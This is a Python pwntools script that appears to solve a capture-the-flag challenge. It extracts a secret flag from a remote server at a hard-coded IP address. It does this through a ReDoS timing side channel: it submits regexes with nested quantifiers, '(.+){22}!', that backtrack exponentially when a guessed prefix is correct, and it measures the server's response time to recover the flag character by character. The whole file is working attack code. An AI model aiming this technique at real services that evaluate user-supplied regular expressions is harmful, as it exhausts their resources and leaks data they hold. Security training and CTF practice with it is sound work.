from pwn import *
import time
import string

# Challenge parameters
HOST = "4.233.210.175" # Remote server
PORT = 9011
CHARS = string.ascii_letters + string.digits + "_-{}!"

def test_regex(regex):
    try:
        r = remote(HOST, PORT, level='error')
        # r.recvuntil(b"> ")
        r.sendline(regex.encode())
        line = r.recvuntil(b"s\n").decode()
        # Extract time from "Time: 0.123456s"
        t_str = line.split("Time: ")[1].split("s")[0]
        r.close()
        return float(t_str)
    except Exception as e:
        print(f"Error: {e}")
        return 0

def solve():
    prefix = "MOJO-JOJO{"
    print(f"Starting leak with prefix: {prefix}")
    
    while True:
        # We need a baseline time for a "fast" failure
        baseline = test_regex("^ZZZZZZZZZZ") 
        print(f"Baseline: {baseline:.6f}s")
        
        found = False
        for c in CHARS:
            # We use a nested quantifier regex that triggers backtracking if the prefix is correct.
            # Pattern: ^PREFIX_GUESS(.+){22}!
            # This triggers exponential backtracking if the prefix matches.
            guess = prefix + c
            regex = f"^{guess}(.+){{22}}!"
            
            t = test_regex(regex)
            print(f"Testing: {guess} -> {t:.6f}s")
            
            # 0.05s is a safe threshold based on 0.13s observed delay
            if t > 0.05:
                prefix += c
                print(f"Found char: {c} | Current flag: {prefix}")
                found = True
                break
        
        if not found:
            print("Leak failed or completed.")
            break
        
        if prefix.endswith("}"):
            print(f"Final flag: {prefix}")
            break

if __name__ == "__main__":
    solve()
